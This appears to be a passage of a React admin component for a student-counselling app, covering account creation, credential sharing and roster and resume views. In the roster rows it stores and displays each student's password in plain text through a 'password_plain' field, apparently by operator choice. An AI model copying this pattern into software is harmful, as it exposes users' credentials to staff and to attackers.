import { useCallback, useEffect, useMemo, useState } from "react";
import { Loader2, UserPlus, Copy, Check, ChevronDown, ChevronRight, AlertCircle, KeyRound, X, MessageCircle, Mail, Link2, Search, Download, RefreshCw, Eye } from "lucide-react";
import { api } from "./api.js";
import { progressFor, TONE_CLASSES } from "./intakeProgress.js";
import ResumeMarkdown from "./ResumeMarkdown.jsx";
import useAutoRefresh from "./useAutoRefresh.js";
import StudentDashboard from "./StudentDashboard.jsx";

// Students tab — visible to admin (full roster) and counsellor (own only).
// Two purposes:
//   1. Sign new students up: type username + optional lead link, get back a
//      one-time generated password the counsellor copies and sends.
//   2. Browse the roster + drill into each student's intake data, uploaded
//      files, and generated resume.
export default function StudentsAdmin({ role, leads = [], autoExpandStudentId = null, onAutoExpandConsumed }) {
  const [students, setStudents] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [expandedId, setExpandedId] = useState(null);

  // Cross-tab handoff: the IELTS panel passes a student_id when its
  // "View" button is clicked. We expand that row on the next render and
  // tell the parent we've consumed it (so a later refocus doesn't keep
  // re-expanding the same row). Scroll into view so the row is visible
  // even when the roster is long.
  useEffect(() => {
    if (!autoExpandStudentId) return;
    setExpandedId(autoExpandStudentId);
    onAutoExpandConsumed?.();
    requestAnimationFrame(() => {
      const el = document.querySelector(`[data-student-row="${autoExpandStudentId}"]`);
      if (el && typeof el.scrollIntoView === "function") {
        el.scrollIntoView({ behavior: "smooth", block: "start" });
      }
    });
  }, [autoExpandStudentId, onAutoExpandConsumed]);
  // Roster filter — case-insensitive substring match across the visible
  // metadata columns. Cheap client-side filter; server pagination is a
  // future concern (we only return the row count up to a few hundred).
  const [filter, setFilter] = useState("");
  const [credentialsModal, setCredentialsModal] = useState(null);
  // "View as student" overlay — preloaded { student, files, resumes }
  // shape from the staff detail endpoint. Lets admin/counsellor see
  // exactly what the student sees on their own dashboard.
  const [viewAsStudent, setViewAsStudent] = useState(null);

  const refresh = useCallback(async () => {
    try {
      const list = await api.listStudents();
      setStudents(list);
      setError(null);
    } catch (e) {
      setError(e.message);
    }
  }, []);

  useEffect(() => {
    let active = true;
    refresh().finally(() => {
      if (active) setLoading(false);
    });
    return () => {
      active = false;
    };
  }, [refresh]);

  useAutoRefresh(refresh);

  const onCreated = (account) => {
    setCredentialsModal(account);
    refresh();
  };

  // Substring filter against the same fields that show on the row card.
  const filteredStudents = useMemo(() => {
    const q = filter.trim().toLowerCase();
    if (!q) return students;
    return students.filter((s) => {
      const haystack = [
        s.username,
        s.display_name,
        s.lead_name,
        s.counsellor_name,
      ]
        .filter(Boolean)
        .join(" ")
        .toLowerCase();
      return haystack.includes(q);
    });
  }, [students, filter]);

  return (
    <div>
      <CreateStudentForm role={role} leads={leads} onCreated={onCreated} />

      {role === "admin" && <ImportExamplesButton />}

      <div className="mt-8 mb-3 flex flex-wrap items-baseline justify-between gap-3 border-b border-stone-300 pb-2">
        <h2 className="text-sm font-semibold uppercase tracking-[0.2em] text-stone-700">
          Students {students.length > 0 && (
            <span className="ml-2 text-xs font-normal text-stone-500">
              ({filteredStudents.length}
              {filteredStudents.length !== students.length ? ` of ${students.length}` : ""})
            </span>
          )}
        </h2>
        <div className="flex items-center gap-2">
          {loading && <Loader2 className="h-4 w-4 animate-spin text-stone-400" />}
          <div className="inline-flex items-center gap-1 border border-stone-300 bg-white px-2 py-1">
            <Search className="h-3 w-3 text-stone-400" />
            <input
              type="search"
              value={filter}
              onChange={(e) => setFilter(e.target.value)}
              placeholder="filter…"
              className="w-40 bg-transparent text-xs outline-none"
            />
          </div>
          <button
            onClick={() => downloadStudentsCsv(filteredStudents)}
            disabled={filteredStudents.length === 0}
            title="Download visible rows as CSV"
            className="inline-flex items-center gap-1 border border-stone-300 bg-white px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-stone-700 transition hover:border-stone-700 disabled:opacity-30"
          >
            <Download className="h-3 w-3" /> CSV
          </button>
        </div>
      </div>

      {error && (
        <p className="mb-3 inline-flex items-center gap-2 text-xs text-red-700">
          <AlertCircle className="h-3 w-3" /> {error}
        </p>
      )}

      {students.length === 0 && !loading && !error && (
        <p className="mt-6 text-sm italic text-stone-500">
          No students yet. Sign someone up using the form above.
        </p>
      )}
      {students.length > 0 && filteredStudents.length === 0 && (
        <p className="mt-6 text-sm italic text-stone-500">
          No students match "{filter}".
        </p>
      )}

      <div className="space-y-2">
        {filteredStudents.map((s) => (
          <StudentRow
            key={s.student_id}
            row={s}
            expanded={expandedId === s.student_id}
            onToggle={() => setExpandedId((p) => (p === s.student_id ? null : s.student_id))}
            onResetPassword={(account) => setCredentialsModal(account)}
            onViewAs={(detail) => setViewAsStudent(detail)}
          />
        ))}
      </div>

      {credentialsModal && (
        <CredentialsModal
          account={credentialsModal}
          onClose={() => setCredentialsModal(null)}
        />
      )}

      {viewAsStudent && (
        <ViewAsStudentModal
          detail={viewAsStudent}
          onClose={() => setViewAsStudent(null)}
        />
      )}
    </div>
  );
}

// ============================================================
// ViewAsStudentModal — full-screen overlay that renders the
// post-intake StudentDashboard against a pre-loaded staff payload.
// Lets admin/counsellor see the student's own view without logging
// in as them.
// ============================================================
function ViewAsStudentModal({ detail, onClose }) {
  // Lock body scroll while the overlay is open so the underlying
  // admin panel doesn't scroll behind the dashboard view.
  useEffect(() => {
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = prev; };
  }, []);

  return (
    <div
      className="fixed inset-0 z-50 overflow-y-auto bg-stone-900/40"
      onClick={onClose}
    >
      <div
        className="mx-auto my-6 max-w-5xl border border-stone-300 bg-[#f4f0e6] shadow-xl"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="sticky top-0 z-10 flex items-center justify-between gap-3 border-b border-stone-300 bg-[#f4f0e6]/95 px-5 py-3 backdrop-blur">
          <p className="text-[11px] font-semibold uppercase tracking-[0.2em] text-stone-700">
            <Eye className="mr-2 inline-block h-3 w-3" />
            Viewing as {detail.student?.display_name || detail.student?.username}
          </p>
          <button
            onClick={onClose}
            className="inline-flex items-center gap-1 border border-stone-400 px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-stone-700 hover:border-stone-700"
          >
            <X className="h-3 w-3" /> Close
          </button>
        </div>
        <StudentDashboard staffPreview={detail} />
      </div>
    </div>
  );
}

// ============================================================
// CreateStudentForm — the counsellor / admin signup form.
// ============================================================
function CreateStudentForm({ role, leads, onCreated }) {
  const [username, setUsername] = useState("");
  const [displayName, setDisplayName] = useState("");
  const [leadId, setLeadId] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [err, setErr] = useState(null);

  const eligibleLeads = useMemo(
    () => (Array.isArray(leads) ? leads.filter((l) => !l.archived) : []),
    [leads]
  );

  const submit = async (e) => {
    e.preventDefault();
    setErr(null);
    setSubmitting(true);
    try {
      const account = await api.createStudent({
        username: username.trim(),
        display_name: displayName.trim() || null,
        lead_id: leadId || null,
      });
      onCreated(account);
      setUsername("");
      setDisplayName("");
      setLeadId("");
    } catch (e) {
      setErr(e.message);
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <form
      onSubmit={submit}
      className="rounded-none border border-stone-300 bg-white p-5"
    >
      <p className="mb-3 text-[11px] font-semibold uppercase tracking-[0.2em] text-stone-700">
        Sign up a new student
      </p>
      <div className="grid grid-cols-1 gap-4 md:grid-cols-3">
        <label className="block">
          <span className="text-[10px] uppercase tracking-[0.15em] text-stone-500">
            Username *
          </span>
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="e.g. riya_sharma"
            required
            className="mt-1 w-full border-b border-stone-400 bg-transparent py-1 text-sm outline-none focus:border-stone-700"
          />
        </label>
        <label className="block">
          <span className="text-[10px] uppercase tracking-[0.15em] text-stone-500">
            Display name (optional)
          </span>
          <input
            type="text"
            value={displayName}
            onChange={(e) => setDisplayName(e.target.value)}
            placeholder="Riya Sharma"
            className="mt-1 w-full border-b border-stone-400 bg-transparent py-1 text-sm outline-none focus:border-stone-700"
          />
        </label>
        <label className="block">
          <span className="text-[10px] uppercase tracking-[0.15em] text-stone-500">
            Link to lead (optional)
          </span>
          <select
            value={leadId}
            onChange={(e) => setLeadId(e.target.value)}
            className="mt-1 w-full border-b border-stone-400 bg-transparent py-1 text-sm outline-none focus:border-stone-700"
          >
            <option value="">— no lead —</option>
            {eligibleLeads.map((l) => (
              <option key={l.id} value={l.id}>
                {l.name}{l.contact ? ` · ${l.contact}` : ""}
              </option>
            ))}
          </select>
        </label>
      </div>
      <div className="mt-4 flex items-center gap-3">
        <button
          type="submit"
          disabled={submitting || !username.trim()}
          className="inline-flex items-center gap-2 border border-[#cc785c] bg-[#cc785c] px-4 py-2 text-xs uppercase tracking-[0.2em] text-white transition hover:bg-[#b86a4f] disabled:opacity-50"
        >
          {submitting ? <Loader2 className="h-3 w-3 animate-spin" /> : <UserPlus className="h-3 w-3" />}
          {submitting ? "Creating…" : "Create account"}
        </button>
        {err && (
          <span className="inline-flex items-center gap-1 text-xs text-red-700">
            <AlertCircle className="h-3 w-3" /> {err}
          </span>
        )}
      </div>
    </form>
  );
}

// ============================================================
// CredentialsModal — shown after account creation or password reset.
// Three send paths so the counsellor's "send to the student" flow is
// one click instead of manual copy-paste:
//   - Open WhatsApp with the message prefilled
//   - Open the email client with subject + body prefilled
//   - Copy a plain-text version of the same message
// The message includes the login URL with ?u=username so the student's
// login form opens prefilled, plus a short list of documents to have
// ready before they start. The password is shown ONCE — clicking the
// modal away loses it forever (recovery is via Reset pw).
// ============================================================

// Required-doc checklist surfaced in the onboarding message. Mirrors
// the most common intake fields in a friendlier order. Kept here (not
// dynamically derived from the schema) so the message stays short and
// stable; if the schema grows this list should be revisited.
const REQUIRED_DOCS_FOR_MESSAGE = [
  "Class 10, 11, 12 marksheets (PDF or phone photos work)",
  "Passport (front, back, last page)",
  "Test scores: IELTS / TOEFL / SAT / AP — whichever you have",
  "2-3 letters of recommendation (LORs)",
  "Statement of purpose draft",
  "Activity / award certificates",
];

function buildOnboardingMessage(account) {
  const loginUrl = `${window.location.origin}/?u=${encodeURIComponent(account.username)}`;
  return [
    `Hi ${account.display_name || "there"},`,
    ``,
    `Your Persona account is ready. We'll use it to collect your profile + documents and generate tailored resumes for your university applications.`,
    ``,
    `🔗 Log in: ${loginUrl}`,
    `👤 Username: ${account.username}`,
    `🔑 Password: ${account.password}`,
    ``,
    `You'll need these ready (PDF or phone photo both work — your progress saves automatically, no rush):`,
    ...REQUIRED_DOCS_FOR_MESSAGE.map((d) => `  • ${d}`),
    ``,
    `Any questions, message back here.`,
  ].join("\n");
}

function CredentialsModal({ account, onClose }) {
  const [copied, setCopied] = useState(null);

  const message = buildOnboardingMessage(account);
  const loginUrl = `${window.location.origin}/?u=${encodeURIComponent(account.username)}`;
  const whatsappHref = `https://wa.me/?text=${encodeURIComponent(message)}`;
  const mailtoHref =
    `mailto:?subject=${encodeURIComponent("Your Persona account is ready")}` +
    `&body=${encodeURIComponent(message)}`;

  const copy = async (text, label) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(label);
      setTimeout(() => setCopied(null), 1500);
    } catch {
      setCopied("error");
    }
  };

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-stone-900/40 p-4"
      onClick={onClose}
    >
      <div
        className="max-h-[90vh] w-full max-w-lg overflow-y-auto border border-stone-300 bg-white p-6 shadow-xl"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="mb-4 flex items-baseline justify-between">
          <p className="text-[11px] font-semibold uppercase tracking-[0.2em] text-stone-700">
            <KeyRound className="mr-2 inline-block h-3 w-3" />
            Account ready — send to student
          </p>
          <button
            onClick={onClose}
            className="text-stone-500 hover:text-stone-900"
            aria-label="Close"
          >
            <X className="h-4 w-4" />
          </button>
        </div>

        <p className="mb-4 text-xs text-amber-800">
          ⚠ The password is shown <strong>once</strong>. Send it now — if you close
          this modal you'll need to use <em>Reset pw</em> to generate a new one.
        </p>

        <CredField label="Username" value={account.username} onCopy={() => copy(account.username, "username")} copied={copied === "username"} />
        <CredField label="Password" value={account.password} onCopy={() => copy(account.password, "password")} copied={copied === "password"} mono />
        <CredField label="Login link" value={loginUrl} onCopy={() => copy(loginUrl, "url")} copied={copied === "url"} />

        {/* Three send paths — each opens the user's preferred channel
            with a fully-formed message prefilled (login link + creds +
            required-docs checklist). Counsellor edits before sending if
            they want to. Auto-fills the student's own messenger; we
            don't talk to WhatsApp / email APIs from the server. */}
        <div className="mt-5 border-t border-stone-200 pt-4">
          <p className="mb-2 text-[10px] font-semibold uppercase tracking-[0.15em] text-stone-600">
            Send to student
          </p>
          <div className="grid grid-cols-1 gap-2 sm:grid-cols-3">
            <a
              href={whatsappHref}
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center justify-center gap-2 border border-emerald-700 bg-emerald-700 px-3 py-2 text-[11px] uppercase tracking-[0.15em] text-white transition hover:bg-emerald-800"
            >
              <MessageCircle className="h-3 w-3" /> WhatsApp
            </a>
            <a
              href={mailtoHref}
              className="inline-flex items-center justify-center gap-2 border border-stone-700 bg-stone-700 px-3 py-2 text-[11px] uppercase tracking-[0.15em] text-white transition hover:bg-stone-800"
            >
              <Mail className="h-3 w-3" /> Email
            </a>
            <button
              onClick={() => copy(message, "message")}
              className="inline-flex items-center justify-center gap-2 border border-stone-300 bg-white px-3 py-2 text-[11px] uppercase tracking-[0.15em] text-stone-700 transition hover:border-stone-700"
            >
              {copied === "message" ? <Check className="h-3 w-3 text-emerald-700" /> : <Link2 className="h-3 w-3" />}
              {copied === "message" ? "Copied" : "Copy text"}
            </button>
          </div>
          <details className="mt-3">
            <summary className="cursor-pointer text-[10px] uppercase tracking-[0.15em] text-stone-500 hover:text-stone-900">
              Preview message
            </summary>
            <pre className="mt-2 max-h-48 overflow-auto whitespace-pre-wrap border border-stone-200 bg-stone-50 p-2 text-[11px] text-stone-700">
              {message}
            </pre>
          </details>
        </div>

        <button
          onClick={onClose}
          className="mt-6 w-full border border-stone-400 px-4 py-2 text-xs uppercase tracking-[0.2em] text-stone-600 hover:bg-stone-50"
        >
          I've sent them
        </button>
      </div>
    </div>
  );
}

function CredField({ label, value, onCopy, copied, mono }) {
  return (
    <div className="mb-3">
      <p className="text-[10px] uppercase tracking-[0.15em] text-stone-500">{label}</p>
      <div className="mt-1 flex items-center justify-between gap-2 border border-stone-300 bg-stone-50 px-3 py-2">
        <span className={`select-all truncate text-sm text-stone-900 ${mono ? "font-mono" : ""}`}>
          {value}
        </span>
        <button
          onClick={onCopy}
          className="inline-flex shrink-0 items-center gap-1 border border-stone-300 bg-white px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-stone-700 transition hover:border-stone-700"
        >
          {copied ? <Check className="h-3 w-3 text-emerald-700" /> : <Copy className="h-3 w-3" />}
          {copied ? "copied" : "copy"}
        </button>
      </div>
    </div>
  );
}

// Progress text per row — phase + specific step counts. Computed
// client-side from the `data` jsonb so the manifest stays a single
// source of truth in StudentIntake.jsx.
function ProgressLabel({ row }) {
  const { label, tone } = progressFor(row);
  return <span className={TONE_CLASSES[tone] || ""}>{label}</span>;
}

// Admin-only: re-import the resume style corpus from disk into
// intake_examples. Surfaced here because resume generation hard-fails
// when the table is empty (fresh DB, post-deploy, or after the
// example file was swapped on disk). One-click recovery instead of
// SSHing to the server to run npm run import-examples.
function ImportExamplesButton() {
  const [busy, setBusy] = useState(false);
  const [result, setResult] = useState(null);
  const [err, setErr] = useState(null);

  const onClick = async () => {
    setBusy(true);
    setErr(null);
    setResult(null);
    try {
      const r = await api.importExamples();
      setResult(r);
    } catch (e) {
      setErr(e?.message || "Import failed.");
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="mt-6 border border-stone-300 bg-white px-4 py-3">
      <div className="flex items-center justify-between gap-3">
        <div>
          <p className="text-xs font-semibold uppercase tracking-[0.2em] text-stone-700">
            Resume style corpus
          </p>
          <p className="mt-0.5 text-xs text-stone-500">
            Re-imports <span className="font-mono">resume/example_resume/</span> into the database. Run after replacing the example file or on a fresh deploy.
          </p>
        </div>
        <button
          onClick={onClick}
          disabled={busy}
          className="inline-flex shrink-0 items-center gap-1 border border-stone-700 bg-stone-900 px-3 py-1.5 text-[10px] uppercase tracking-[0.15em] text-white transition hover:bg-stone-700 disabled:opacity-50"
        >
          {busy ? <Loader2 className="h-3 w-3 animate-spin" /> : null}
          {busy ? "Importing…" : "Re-import corpus"}
        </button>
      </div>
      {err && (
        <p className="mt-2 inline-flex items-center gap-2 text-xs text-red-700">
          <AlertCircle className="h-3 w-3" /> {err}
        </p>
      )}
      {result && (
        <ul className="mt-2 space-y-0.5 text-[11px] text-stone-600">
          {result.results.map((r, i) => (
            <li key={i} className="font-mono">
              <span className={
                r.action === "inserted" ? "text-emerald-700"
                : r.action === "updated" ? "text-stone-700"
                : r.action === "deactivated" ? "text-amber-700"
                : "text-red-700"
              }>{r.action}</span>
              {" "}{r.label || r.file}
              {r.word_count ? <span className="ml-1 text-stone-400">· {r.word_count}w</span> : null}
              {r.reason ? <span className="ml-1 text-red-700">— {r.reason}</span> : null}
            </li>
          ))}
        </ul>
      )}
    </div>
  );
}

// ============================================================
// StudentRow — collapsed roster row + expandable detail view.
// ============================================================
function StudentRow({ row, expanded, onToggle, onResetPassword, onViewAs }) {
  const [detail, setDetail] = useState(null);
  const [detailLoading, setDetailLoading] = useState(false);
  const [viewAsBusy, setViewAsBusy] = useState(false);

  const refreshDetail = useCallback(async () => {
    try {
      const d = await api.getStudent(row.student_id);
      setDetail(d);
    } catch (e) {
      setDetail({ error: e.message });
    }
  }, [row.student_id]);

  useEffect(() => {
    if (!expanded) return;
    let cancelled = false;
    setDetailLoading(true);
    api.getStudent(row.student_id)
      .then((d) => { if (!cancelled) setDetail(d); })
      .catch((e) => { if (!cancelled) setDetail({ error: e.message }); })
      .finally(() => { if (!cancelled) setDetailLoading(false); });
    return () => { cancelled = true; };
  }, [expanded, row.student_id]);

  // Auto-poll the detail while any resume is mid-generation. Lets the
  // counsellor's view update in place after they hit the staff-side
  // Regenerate button without having to manually re-expand the row.
  useEffect(() => {
    if (!expanded || !detail || detail.error) return;
    const inflight = (detail.resumes || []).some(
      (r) => r.status === "pending" || r.status === "running"
    );
    if (!inflight) return;
    const t = setInterval(refreshDetail, 4000);
    return () => clearInterval(t);
  }, [expanded, detail, refreshDetail]);

  const resetPassword = async (e) => {
    e.stopPropagation();
    if (!confirm(`Reset password for "${row.username}"? The new password will be shown once.`)) return;
    try {
      const account = await api.resetStudentPassword(row.student_id);
      onResetPassword(account);
    } catch (e) {
      alert(`Reset failed: ${e.message}`);
    }
  };

  const openViewAs = async (e) => {
    e.stopPropagation();
    if (viewAsBusy) return;
    setViewAsBusy(true);
    try {
      // Reuse the already-loaded detail when the row is expanded so a
      // counsellor double-checking a student doesn't pay a second
      // round-trip to the same endpoint.
      const d = (detail && !detail.error) ? detail : await api.getStudent(row.student_id);
      onViewAs(d);
    } catch (err) {
      alert(`Couldn't open student view: ${err?.message || "unknown error"}`);
    } finally {
      setViewAsBusy(false);
    }
  };

  return (
    <div data-student-row={row.student_id} className="border border-stone-300 bg-white">
      <button
        onClick={onToggle}
        className="flex w-full items-center gap-3 px-4 py-3 text-left hover:bg-stone-50"
      >
        {expanded ? (
          <ChevronDown className="h-4 w-4 shrink-0 text-stone-500" />
        ) : (
          <ChevronRight className="h-4 w-4 shrink-0 text-stone-500" />
        )}
        <div className="min-w-0 flex-1">
          <p className="truncate font-semibold text-stone-900">
            {row.display_name || row.username}
            {row.display_name && (
              <span className="ml-2 text-xs font-normal text-stone-500">@{row.username}</span>
            )}
          </p>
          <p className="mt-0.5 text-xs text-stone-500">
            <ProgressLabel row={row} />
            {" · "}
            {row.file_count} files{" · "}
            {row.resume_count} resumes
            {" · "}
            <span className="text-stone-400">{activityLabel(row)}</span>
            {row.lead_name && <> {" · "} from lead: <span className="text-stone-700">{row.lead_name}</span></>}
            {row.counsellor_name && <> {" · "} by: {row.counsellor_name}</>}
          </p>
          {/* Plain-text login credential. Operator opted in — see
              migrate.js password_plain column comment. */}
          {row.password_plain && (
            <p className="mt-1 text-[11px] text-stone-500">
              pw:{" "}
              <span
                className="select-all font-mono text-stone-800"
                onClick={(e) => e.stopPropagation()}
              >
                {row.password_plain}
              </span>
            </p>
          )}
        </div>
        <span className="ml-3 hidden shrink-0 items-center gap-1 sm:inline-flex">
          <button
            onClick={openViewAs}
            disabled={viewAsBusy}
            title="Open this student's panel — the same page they see after intake"
            className="inline-flex items-center gap-1 border border-stone-300 px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-stone-600 hover:border-stone-700 hover:text-stone-900 disabled:opacity-50"
          >
            {viewAsBusy ? <Loader2 className="h-3 w-3 animate-spin" /> : <Eye className="h-3 w-3" />}
            View as
          </button>
          <button
            onClick={resetPassword}
            className="border border-stone-300 px-2 py-1 text-[10px] uppercase tracking-[0.15em] text-stone-600 hover:border-stone-700 hover:text-stone-900"
          >
            Reset pw
          </button>
        </span>
      </button>

      {expanded && (
        <div className="border-t border-stone-200 bg-stone-50 p-4">
          {detailLoading && (
            <p className="text-xs italic text-stone-500">Loading…</p>
          )}
          {detail?.error && (
            <p className="text-xs text-red-700">{detail.error}</p>
          )}
          {detail && !detail.error && (
            <StudentDetail detail={detail} onRefresh={refreshDetail} />
          )}
        </div>
      )}
    </div>
  );
}

// ============================================================
// StudentDetail — read-only view of intake answers + uploaded files
// + any generated resumes for one student. Staff can also trigger
// a regenerate per resume row (no read-write surface beyond that).
// ============================================================
function StudentDetail({ detail, onRefresh }) {
  const { student, files, resumes } = detail;
  const [regen, setRegen] = useState({}); // { [resumeId]: { busy, err } }
  const handleRegen = useCallback(async (resumeId) => {
    if (!confirm("Regenerate this resume against the student's current data? Takes 30–60 seconds.")) return;
    setRegen((p) => ({ ...p, [resumeId]: { busy: true, err: null } }));
    try {
      await api.staffRegenerateResume(student.student_id, resumeId);
      // Refresh once now; the polling effect on the parent picks up
      // the now-pending status and continues to refresh until terminal.
      if (onRefresh) await onRefresh();
      setRegen((p) => ({ ...p, [resumeId]: { busy: false, err: null } }));
    } catch (e) {
      setRegen((p) => ({ ...p, [resumeId]: { busy: false, err: e?.message || "Regenerate failed." } }));
    }
  }, [student.student_id, onRefresh]);
  // Phase pill: explicit signal of where the student is in the
  // pipeline. Replaces the implicit-from-counts indicator.
  const phaseLabel = ({
    intake: "Filling intake form",
    generating: "Generating resume",
    done: "Intake complete",
  }[student?.intake_phase] || "Filling intake form");
  return (
    <div className="space-y-5 text-xs">
      <div className="flex items-center justify-between border-b border-stone-200 pb-2">
        <span className="text-[10px] uppercase tracking-[0.2em] text-stone-500">Pipeline phase</span>
        <span className={`text-[11px] font-medium ${
          student?.intake_phase === "done" ? "text-emerald-700"
          : student?.intake_phase === "generating" ? "text-amber-700"
          : "text-stone-600"
        }`}>{phaseLabel}</span>
      </div>

      <Section title="Intake form data">
        {student?.data && Object.keys(student.data).length > 0 ? (
          <IntakeAnswers data={student.data} />
        ) : (
          <p className="italic text-stone-500">Student hasn't started filling the form yet.</p>
        )}
      </Section>

      {/* Order: intake answers → AI-generated content → uploaded
          documents. Mirrors how staff actually skim a profile — what
          the student said, then what the system produced from it, then
          the underlying source files for verification. */}
      <Section title={`AI-generated resumes (${resumes?.length || 0})`}>
        {resumes?.length ? (
          <div className="space-y-3">
            {resumes.map((r) => {
              const snapshot = parseSnapshot(r.source_snapshot);
              const stale =
                r.status === "succeeded" &&
                student?.updated_at &&
                r.created_at &&
                new Date(student.updated_at).getTime() > new Date(r.created_at).getTime() + 5_000;
              return (
              <div key={r.id} className="border border-stone-200 bg-white">
                <header className="flex items-center justify-between gap-3 border-b border-stone-100 px-3 py-2">
                  <span className="text-stone-900">
                    {r.label || `Resume #${r.id}`}
                    {stale && (
                      <span
                        className="ml-2 rounded-sm bg-amber-100 px-1.5 py-0.5 text-[9px] font-semibold uppercase tracking-[0.15em] text-amber-800"
                        title={`Student edited their data after this resume was generated (${humanRelative(student.updated_at)} vs ${humanRelative(r.created_at)})`}
                      >
                        may be stale
                      </span>
                    )}
                  </span>
                  <div className="flex items-center gap-3">
                    <span className="text-[10px] uppercase tracking-[0.15em] text-stone-500">
                      {snapshot?.actual_words && snapshot?.target_words
                        ? <span title={snapshot.length_warning || ""} className={snapshot.length_warning ? "text-amber-700" : ""}>
                            {snapshot.actual_words}w / {snapshot.target_words}w target
                          </span>
                        : r.length_words ? `${r.length_words}w` : r.length_pages ? `${r.length_pages}p` : ""}
                      {" · "}
                      <span className={
                        r.status === "succeeded" ? "text-emerald-700"
                        : r.status === "failed" ? "text-red-700"
                        : "text-amber-700"
                      }>{r.status}</span>
                    </span>
                    {(r.status === "succeeded" || r.status === "failed") && (
                      <button
                        type="button"
                        onClick={() => handleRegen(r.id)}
                        disabled={regen[r.id]?.busy}
                        className="inline-flex items-center gap-1 border border-stone-300 bg-white px-2 py-0.5 text-[10px] uppercase tracking-[0.15em] text-stone-700 transition hover:border-stone-700 hover:text-stone-900 disabled:opacity-50"
                      >
                        <RefreshCw className={`h-3 w-3 ${regen[r.id]?.busy ? "animate-spin" : ""}`} />
                        {regen[r.id]?.busy ? "Starting…" : "Regenerate"}
                      </button>
                    )}
                  </div>
                </header>
                {regen[r.id]?.err && (
                  <p className="border-b border-stone-100 bg-red-50 px-3 py-1.5 text-[10px] text-red-700">
                    {regen[r.id].err}
                  </p>
                )}
                {snapshot?.length_warning && (
                  <p className="border-b border-stone-100 bg-amber-50 px-3 py-1.5 text-[10px] text-amber-800">
                    ⚠ {snapshot.length_warning}
                  </p>
                )}
                {/* Same renderer the student sees on their dashboard.
                    Capped height with overflow so a 2-page resume
                    doesn't dominate the row. */}
                {r.content_md ? (
                  <div className="max-h-[600px] overflow-auto bg-white px-4 py-3">
                    <ResumeMarkdown>{r.content_md}</ResumeMarkdown>
                  </div>
                ) : r.error ? (
                  <p className="px-3 py-2 text-[10px] text-red-700">{String(r.error).slice(0, 300)}</p>
                ) : (
                  <p className="px-3 py-2 text-[10px] italic text-stone-500">Generation in progress…</p>
                )}
              </div>
              );
            })}
          </div>
        ) : (
          <p className="italic text-stone-500">No resumes generated yet.</p>
        )}
      </Section>

      <Section title={`Uploaded documents (${files?.length || 0})`}>
        {files?.length ? (
          <div className="space-y-1">
            {files.map((f) => (
              <div key={f.id} className="flex items-center gap-2 border border-stone-200 bg-white px-3 py-2">
                <span className="font-mono text-[10px] text-stone-400">{f.field_id}</span>
                <a
                  href={`/api/students/${student.student_id}/files/${f.id}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex-1 truncate text-stone-900 underline-offset-2 hover:underline"
                >
                  {f.original_name}
                </a>
                <span className="shrink-0 text-[10px] text-stone-400">
                  {humanSize(f.size)}{f.superseded_at && " · superseded"}
                </span>
              </div>
            ))}
          </div>
        ) : (
          <p className="italic text-stone-500">No files uploaded.</p>
        )}
      </Section>
    </div>
  );
}

// Best-effort decode of the source_snapshot column: server stringifies
// it on write but node-postgres may return it pre-parsed (jsonb) or
// as a string depending on driver settings. Handle both. Logging on
// failure (rather than swallowing) so a corrupt row doesn't silently
// hide the word-count + stale signals from staff.
function parseSnapshot(s) {
  if (!s) return null;
  if (typeof s === "object") return s;
  try { return JSON.parse(s); } catch (e) {
    console.warn("[StudentsAdmin] source_snapshot parse failed:", e?.message);
    return null;
  }
}

// Activity label per row. The list endpoint's `updated_at` is set
// even on row-creation, so a brand-new student would otherwise read
// as "last active just now" before they've ever logged in. Detect
// the never-touched case (no answers in data) and surface the row's
// creation time instead.
function activityLabel(row) {
  const answers = row?.data?.answers;
  const hasAnyActivity = answers && typeof answers === "object" && Object.keys(answers).length > 0;
  if (!hasAnyActivity) return `Created ${humanRelative(row.created_at || row.updated_at)}`;
  return `Last active ${humanRelative(row.updated_at)}`;
}

// "5m ago" / "3h ago" / "2d ago". Compact enough to fit on a row
// without breaking the layout. Falls back to "—" for missing input
// and clamps clock-skew futures to "just now" instead of "-5m ago".
function humanRelative(iso) {
  if (!iso) return "—";
  const ms = Date.now() - new Date(iso).getTime();
  if (Number.isNaN(ms)) return "—";
  if (ms < 60_000) return "just now";
  const min = Math.round(ms / 60_000);
  if (min < 60) return `${min}m ago`;
  const hr = Math.round(min / 60);
  if (hr < 24) return `${hr}h ago`;
  const d = Math.round(hr / 24);
  if (d < 30) return `${d}d ago`;
  const mo = Math.round(d / 30);
  if (mo < 12) return `${mo}mo ago`;
  return `${Math.round(mo / 12)}y ago`;
}

// IntakeAnswers — render the student.data blob as human-readable
// rows. The intake JSONB is `{ answers: {fieldId: value, ...},
// order: [...], lastStep: N }`. We only show `answers`; the other
// keys are UI bookkeeping. File slots collapse to "[file: name]"
// since the actual download lives in the Uploaded files section.
function IntakeAnswers({ data }) {
  const answers = (data && typeof data === "object" && data.answers) || data || {};
  const entries = Object.entries(answers).filter(([, v]) => v != null && v !== "");
  if (entries.length === 0) {
    return <p className="italic text-stone-500">No answers yet.</p>;
  }
  return (
    <div className="border border-stone-200 bg-white">
      <table className="w-full">
        <tbody>
          {entries.map(([key, val]) => (
            <tr key={key} className="border-b border-stone-100 last:border-0">
              <td className="w-1/3 px-3 py-1.5 align-top font-mono text-[10px] text-stone-500">{key}</td>
              <td className="px-3 py-1.5 text-[11px] text-stone-800">
                <AnswerCell value={val} />
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function AnswerCell({ value }) {
  if (value && typeof value === "object" && !Array.isArray(value)) {
    // File slot shape: { name, status, uploadedUrl, ... }
    if (typeof value.name === "string" && "status" in value) {
      return (
        <span className="font-mono text-[10px] text-stone-600">
